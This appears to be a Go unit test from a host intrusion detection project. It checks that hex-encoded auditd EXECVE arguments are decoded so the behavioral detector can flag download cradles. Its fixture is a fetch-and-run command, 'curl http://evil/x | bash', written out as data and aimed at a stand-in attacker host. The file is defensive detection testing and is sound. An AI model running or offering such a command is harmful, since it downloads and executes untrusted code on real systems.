package execaudit_test

import (
	"encoding/hex"
	"testing"

	"github.com/lucianoengel/openshield/internal/behavioral"
	"github.com/lucianoengel/openshield/internal/connectors/execaudit"
)

// HIPS-6: auditd hex-encodes an argv value containing spaces (which every real cradle has), and the
// parser must DECODE it — otherwise the behavioral detector sees an opaque hex blob and is blind to
// exactly the commands it exists to catch. Real evasion: a cradle whose spaced arg is hex-encoded.
func TestAuditHexEncodedArgvIsDecoded(t *testing.T) {
	cradle := "curl http://evil/x | bash"
	hexArg := hex.EncodeToString([]byte(cradle)) // auditd emits this BARE (unquoted) for a spaced arg
	// argc=3: bash, -c (quoted), then the hex-encoded cradle (unquoted).
	line := `type=EXECVE msg=audit(1.0:9): argc=3 a0="bash" a1="-c" a2=` + hexArg
	e, err := execaudit.ParseExecve(line)
	if err != nil {
		t.Fatal(err)
	}
	if len(e.Args) != 3 || e.Args[2] != cradle {
		t.Fatalf("hex-encoded arg not decoded: got %q, want %q", e.Args[2], cradle)
	}
	// End-to-end: the decoded cradle now trips the behavioral detector (it would not as raw hex).
	if !behavioral.Analyze("/bin/bash", "", e.Args).EncodedCommand {
		t.Error("the decoded cradle did not trip the detector — hex decode not wired to detection")
	}
	// A QUOTED simple value is not hex-decoded (it is stripped, not treated as hex).
	q, _ := execaudit.ParseExecve(`type=EXECVE msg=audit(1.0:10): argc=1 a0="deadbeef"`)
	if q.Args[0] != "deadbeef" {
		t.Errorf("a quoted value was wrongly hex-decoded: %q", q.Args[0])
	}
}
